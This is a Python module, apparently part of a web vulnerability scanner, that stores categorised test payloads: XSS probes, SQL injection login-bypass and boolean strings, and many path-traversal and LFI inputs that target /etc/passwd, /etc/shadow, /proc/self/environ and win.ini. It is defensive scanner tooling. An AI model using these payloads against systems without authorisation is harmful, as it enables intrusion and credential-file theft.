"""Curated payload database used by the scanner.

This module provides a central dictionary of **safe**, non-destructive
payloads that can be used for initial probing.  The idea is to keep a
lightweight, read‑only store that other components (scanner, mutation
engine, AI selector, etc.) can reference.

The payloads are organised by category so that the `ai_selector` can
request a particular group and the mutation engine can operate
accordingly.

All payloads included here are intentionally benign; they are meant to
trigger application logic without causing data loss or service
interruption.  For example SQL injection strings are error/boolean
probes and open redirect samples point back to a harmless domain.
"""

from typing import Dict, List

# NOTE: the payload lists are intentionally conservative/benign.  If you
# extend them for your own testing please ensure you are authorised to do
# so.

PAYLOAD_DB: Dict[str, List[str]] = {
    # reflected XSS probes (simple, non-malicious)
    "xss": [
        "<script>alert(1)</script>",
        '"></script><script>alert(1)</script>',
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<body onload=alert(1)>",
    ],

    # SQL injection error-based payloads (intent to cause parse errors)
    "sqli_error": [
        "' OR '1'='1' -- ",
        "' UNION SELECT NULL -- ",
        "\" OR \"\"=\"\" -- ",
        "admin' --",
    ],

    # Boolean-based SQL injection / logic tests
    "sqli_boolean": [
        "1' AND 1=1 -- ",
        "1' AND 1=2 -- ",
        "' OR 'x'='x",
    ],

    # Boolean-based SQL injection - TRUE conditions (should return normal/more results)
    "sqli_boolean_true": [
        "' AND '1'='1",
        "1' AND '1'='1",
        "' AND 1=1 -- ",
        "1 AND 1=1",
        "' OR '1'='1",
        "admin' OR 'x'='x",
    ],

    # Boolean-based SQL injection - FALSE conditions (should return no/fewer results)
    "sqli_boolean_false": [
        "' AND '1'='2",
        "1' AND '1'='2",
        "' AND 1=2 -- ",
        "1 AND 1=2",
        "' OR '1'='2",
        "admin' AND '1'='2",
    ],

    # Directory traversal probes (trying to reach sensitive files)
    "dir_traversal": [
        "../",  # relative traversal - basic
        "..\\",  # windows style
        "../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "....//....//....//etc/passwd",
        "../../etc/shadow",
        "../../../../etc/shadow",
        "../../../../../etc/shadow",
        "../../../etc/hosts",
        "../../../proc/self/environ",
        "../../../proc/version",
        "../../../../proc/version",
        # Windows traversal
        "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "..\\..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\winnt\\win.ini",
        "..%5C..%5C..%5Cwindows%5Cwin.ini",
    ],
    
    # LFI specific payloads for query parameters
    "lfi": [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..\\/..\\/..\\/etc/passwd",
        "../../etc/shadow",
        "../../../../etc/shadow",
        "../../../../../../etc/shadow",
        "../../etc/hosts",
        "../../../etc/hosts",
        "../../../../etc/hosts",
        "../../../proc/self/environ",
        "../../../proc/self/cmdline",
        "../../../proc/version",
        "../../../../proc/version",
        "../../../../../proc/version",
        # Windows
        "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "..\\..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\winnt\\win.ini",
        "..\\..\\..\\..\\..\\windows\\win.ini",
        "..%5C..%5C..%5Cwindows%5Cwin.ini",
        "..%255c..%255c..%255cwindows%255cwin.ini",
        # Null byte bypass
        "../../etc/passwd%00.jpg",
        "../../etc/passwd\x00.png",
        "..\\..\\windows\\win.ini%00.txt",
    ],

    # Open redirect probes that point to a harmless, controlled domain
    "open_redirect": [
        "https://example.com/",
        "http://test.com/"
    ],

    # Header misconfiguration check values; these are not "payloads" per
    # se but the database is a convenient place to store them.
    "header_checks": [
        "<script>alert(1)</script>",
        "../",
    ],

    # HTTP methods we consider "unsafe" for safety testing.  The scanner
    # will attempt the method and note when the server accepts it.
    "http_methods": ["PUT", "DELETE", "TRACE", "OPTIONS"],
}


def get_payloads(category: str) -> List[str]:
    """Return the list of payloads for a given category.

    Parameters
    ----------
    category : str
        Name of the category ("xss", "sqli_error", etc.).

    Returns
    -------
    List[str]
        Payloads associated with the category; empty list if unknown.
    """
    return PAYLOAD_DB.get(category, []).copy()
